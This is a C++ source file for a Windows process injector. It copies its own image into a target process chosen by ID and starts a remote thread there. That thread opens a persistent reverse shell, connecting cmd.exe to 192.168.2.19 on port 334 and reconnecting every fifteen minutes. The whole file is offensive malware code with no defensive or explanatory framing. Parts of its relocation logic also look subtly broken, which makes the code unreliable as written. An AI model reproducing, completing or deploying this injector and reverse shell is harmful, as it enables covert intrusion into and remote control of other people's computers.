// PeInjector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


typedef struct ERROR_MESSAGE {
	const char* CANNOT_OPEN_TRAGET = "- Cannot open target process\r\n";
	const char* CANNOT_GET_IMAGE_BASE = "- Cannot get image base of current process\r\n";
	const char* CANNOT_GET_DOS_HEADER = "- Cannot get image dos header of current process\r\n";
	const char* CANNOT_GET_NT_HEADER = "- Cannot get image nt headers of current process\r\n";
	const char* CANNOT_GET_IMAGE_BASE_RELOCATION = "- Cannot get image base relocation\r\n";
	const char* CANNOT_GET_TARGET_ID = "- Cannot get target id for injection\r\nPeInjector.exe <Target ID>\r\n";
	const char* CANNOT_ALLOCATE_TARGET_MEMORY = "- Cannot allocate target process memory\r\n";
	const char* CANNOT_ALLOCATE_CURRENT_MEMORY = "- Cannot allocate current process memory\r\n";
	const char* CANNOT_CALCULATE_ALLOCATED_IMAGE = "- Cannot calculate allocated image size\r\n";
	const char* CANNOT_WRITE_TARGET_MEMORY = "- Cannot write target memory\r\n";
	const char* CANNOT_CREATE_REMOTE_THREAD = "- Cannot create remote thread : %d\r\n";
} ERROR_MESSAGE;

ERROR_MESSAGE errorMessage;

DWORD ThreadFunc()
{

	Sleep(1000);
	
	const char* remoteServer = "192.168.2.19";
	const int port = 334;

	HMODULE hmModule = LoadLibrary("Ws2_32.dll");

	while (true)
	{
		WSADATA wsaData;
		SOCKET Winsock;
		SOCKET Sock;
	    sockaddr_in hax;
		STARTUPINFO sinfo = { 0 };
		PROCESS_INFORMATION pinfo = { 0 };
	
		WSAStartup(MAKEWORD(2, 2), &wsaData);

		Winsock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

		hax.sin_family = AF_INET;
		hax.sin_port = htons(port);
		inet_pton(AF_INET, remoteServer, &hax.sin_addr);
		WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
		
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)Winsock;

		char cmd[] = "cmd.exe";

		CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);

		Sleep(15 * 60000);
	}
}

int peInject(int processID) {

	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESTDHANDLES;

	HANDLE hProcess = NULL;
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, processID);

	if (!hProcess) {
		printf(errorMessage.CANNOT_OPEN_TRAGET);
		return -1;
	}

	PVOID64 imageBase = GetModuleHandle(NULL);
	if (!imageBase) {
		printf(errorMessage.CANNOT_GET_IMAGE_BASE);
		return -1;
	}

	PIMAGE_DOS_HEADER dosHeader = NULL;
	dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (!dosHeader) {
		printf(errorMessage.CANNOT_GET_DOS_HEADER);
		return -1;
	}

	PIMAGE_NT_HEADERS ntHeader = NULL;
	ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dosHeader->e_lfanew);
	if (!ntHeader) {
		printf(errorMessage.CANNOT_GET_NT_HEADER);
		return -1;
	}

	PVOID64 allocatedMem = NULL;
	allocatedMem = VirtualAllocEx(hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!allocatedMem) {
		printf(errorMessage.CANNOT_ALLOCATE_TARGET_MEMORY);
		return -1;
	}

	PVOID64 Buffer = NULL;
	Buffer = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Buffer) {
		printf(errorMessage.CANNOT_ALLOCATE_CURRENT_MEMORY);
		return -1;
	}

	memcpy(Buffer, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	PIMAGE_BASE_RELOCATION baseRelocation = NULL;
	baseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)Buffer + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	if (!baseRelocation) {
		printf(errorMessage.CANNOT_GET_IMAGE_BASE_RELOCATION);
		return 0;
	}

	DWORD_PTR delta, oldDelta;
	HANDLE hModule = GetModuleHandle(NULL);

	delta = (DWORD_PTR)((LPBYTE)allocatedMem - imageBase);
	oldDelta = (DWORD_PTR)((LPBYTE)hModule - ntHeader->OptionalHeader.ImageBase);

	if (!delta) {
		printf(errorMessage.CANNOT_CALCULATE_ALLOCATED_IMAGE);
		return -1;
	}

	ULONG64 count = 0, i = 0;
	PUSHORT offset;
	LPWORD list;
	PDWORD_PTR p;
	while (baseRelocation->VirtualAddress)
	{
		if (baseRelocation->SizeOfBlock == sizeof(IMAGE_BASE_RELOCATION))
		{
			count = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / sizeof(DWORD));
			offset = (PUSHORT)baseRelocation + 1;
			list = (LPWORD)((LPBYTE)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));
			for (i = 0; i < count; i++)
			{
				if (list[i] > 0)
				{
					p = (PDWORD_PTR)((LPBYTE)Buffer + (baseRelocation->VirtualAddress + (0x0fff & (list[i]))));

					*p -= oldDelta;
					*p += delta;
				}
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)baseRelocation + baseRelocation->SizeOfBlock);
	}

	BOOL bWrite = FALSE;
	bWrite = WriteProcessMemory(hProcess, allocatedMem, Buffer, ntHeader->OptionalHeader.SizeOfImage, NULL);
	if (!bWrite) {
		printf(errorMessage.CANNOT_WRITE_TARGET_MEMORY);
		VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	VirtualFree(Buffer, 0, MEM_RELEASE);

	HANDLE hThread = NULL;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((PUCHAR)ThreadFunc + delta), NULL, 0, NULL);
	if (!hThread) {
		printf(errorMessage.CANNOT_CREATE_REMOTE_THREAD);
		VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	return 0;
}

int main(int argc, char* argv[])
{
	if (argc <= 1) {
		printf(errorMessage.CANNOT_GET_TARGET_ID);
		return -1;
	}

	char* p;
	long processID = strtol(argv[1], &p, 10);

	if (*p != '\0' || errno != 0) {
		printf(errorMessage.CANNOT_GET_TARGET_ID);
		return -1;
	}

	int result = peInject(processID);

	exit(result);
}
